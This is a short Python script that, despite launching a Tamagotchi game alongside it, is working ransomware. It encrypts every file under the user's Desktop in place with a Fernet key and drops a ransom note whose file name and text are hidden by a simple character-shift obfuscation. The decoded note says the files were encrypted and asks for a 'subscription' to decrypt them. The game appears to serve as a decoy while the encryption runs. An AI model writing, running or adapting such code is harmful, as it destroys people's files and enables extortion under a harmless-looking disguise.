import multiprocessing
import os
import subprocess
import pkg_resources
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import simpledialog
import tamagotchi  # Asegúrate de que el código del Tamagotchi esté en un archivo llamado tamagotchi.py

REQUIRED_PACKAGES = [
    'cryptography'
]

for package in REQUIRED_PACKAGES:
    try:
        dist = pkg_resources.get_distribution(package)
        print('{} ({}) está instalado'.format(dist.key, dist.version))
    except pkg_resources.DistributionNotFound:
        print('{} NO está instalado'.format(package))
        subprocess.call(['pip', 'install', package])

def desencriptar(cadena):
    return ''.join(chr(ord(c) - 1) for c in cadena)

def generar_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:  # Cambiado de desencriptar("lfp.lfp") a 'key.key'
        key_file.write(key)
    return key

def cargar_key():
    return open('key.key', 'rb').read()  # Cambiado de desencriptar("lfp.lfp") a 'key.key'


def encrypt(item, key):
    f = Fernet(key)
    with open(item, 'rb') as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(item, 'wb') as file:
        file.write(encrypted_data)

def get_all_files_in_directory(dir_path):
    files_list = []
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            files_list.append(os.path.join(root, file))
    return files_list

def main_encryption():
    path_to_encrypt = os.path.expanduser('~/Desktop')  # Ahora obtiene automáticamente el directorio del usuario
    all_files = get_all_files_in_directory(path_to_encrypt)

    key = generar_key()

    with multiprocessing.Pool() as pool:
        pool.starmap(encrypt, [(file, key) for file in all_files])

    with open(path_to_encrypt+'\\'+desencriptar("sfbenf.ufy"), 'w') as file:
        file.write(desencriptar('Gjdifspft fodsjuqbept qps fm ujup Fsspejohfs\n'))
        file.write(desencriptar('Ebnf vo fvttdsjqujpo qbsb eftfodsjqubs. Uibolt'))

    with multiprocessing.Pool() as pool:
        pool.starmap(encrypt, [(file, key) for file in all_files])

if __name__ == '__main__':
    p1 = multiprocessing.Process(target=main_encryption)
    p2 = multiprocessing.Process(target=tamagotchi.main)  # El código del Tamagotchi tenga una función main

    p1.start()
    p2.start()

    p1.join()
    p2.join()
